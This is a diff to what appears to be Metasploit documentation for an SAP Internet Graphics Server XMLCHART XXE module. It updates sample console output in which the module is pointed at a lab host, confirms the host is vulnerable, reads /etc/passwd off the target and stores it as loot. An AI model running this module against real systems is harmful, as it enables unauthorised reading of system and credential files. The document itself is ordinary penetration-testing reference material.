@@ -83,11 +83,11 @@ Module options (auxiliary/admin/sap/sap_igs_xmlchart_xxe):
    Name     Current Setting      Required  Description
    ----     ---------------      --------  -----------
    FILE     /etc/passwd          no        File to read from the remote server
-   URIPATH  /XMLCHART            yes       Path to the SAP IGS XMLCHART page from the web root
    Proxies  http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS   172.16.30.29         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT    40080                yes       The target port (TCP)
    SSL      false                no        Negotiate SSL/TLS for outgoing connections
+   URIPATH  /XMLCHART            yes       Path to the SAP IGS XMLCHART page from the web root
    VHOST                         no        HTTP server virtual host
 
 
@@ -99,9 +99,7 @@ Auxiliary action:
 
 
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > check
-
-[*] System is vulnerable, but the file /etc/os-release was not found on the host 172.16.30.29
-[+] 172.16.30.29:40080 - The target is vulnerable. 172.16.30.29 returned a response indicating that its XMLCHART page is vulnerable to XXE!
+[+] 172.16.30.29:40080 - The target is vulnerable. 172.16.30.29 running OS: SUSE Linux Enterprise Server for SAP Applications 12 SP1 returned a response indicating that its XMLCHART page is vulnerable to XXE!
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > run
 [*] Running module against 172.16.30.29
 
@@ -134,7 +132,7 @@ admin:x:1000:100:admin:/home/admin:/bin/bash
 j45adm:x:1001:1001:SAP System Administrator:/home/j45adm:/bin/csh
 sybj45:x:1002:1001:SAP Database Administrator:/sybase/J45:/bin/csh
 sapadm:x:1003:1001:SAP System Administrator:/home/sapadm:/bin/false
-[+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20201004145707_SAP_TEST_172.16.30.29_sap.igs.xmlchart.xxe_245322.txt
+[+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20201007131238_SAP_TEST_172.16.30.29_igs.xmlchart.xxe_346716.txt
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > services
 Services
@@ -151,16 +149,16 @@ Vulnerabilities
 
 Timestamp                Host          Name                                             References
 ---------                ----          ----                                             ----------
-2020-10-04 11:57:07 UTC  172.16.30.29  SAP Internet Graphics Server (IGS) XMLCHART XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
+2020-10-07 10:12:37 UTC  172.16.30.29  SAP Internet Graphics Server (IGS) XMLCHART XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
 
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > loot
 
 Loot
 ====
 
-host          service  type                  name         content     info                  path
-----          -------  ----                  ----         -------     ----                  ----
-172.16.30.29           sap.igs.xmlchart.xxe  /etc/passwd  text/plain  SAP IGS XMLCHART XXE  /Users/vladimir/.msf4/loot/a6830367b9fbf8f75b13-20201004145707_SAP_TEST_172.16.30.29_sap.igs.xmlchart.xxe_245322.txt
+host          service  type              name         content     info                  path
+----          -------  ----              ----         -------     ----                  ----
+172.16.30.29           igs.xmlchart.xxe  /etc/passwd  text/plain  SAP IGS XMLCHART XXE  /Users/vladimir/.msf4/loot/01619fd331da98b5ac4d-20201007131238_SAP_TEST_172.16.30.29_igs.xmlchart.xxe_346716.txt
 
 ```
 
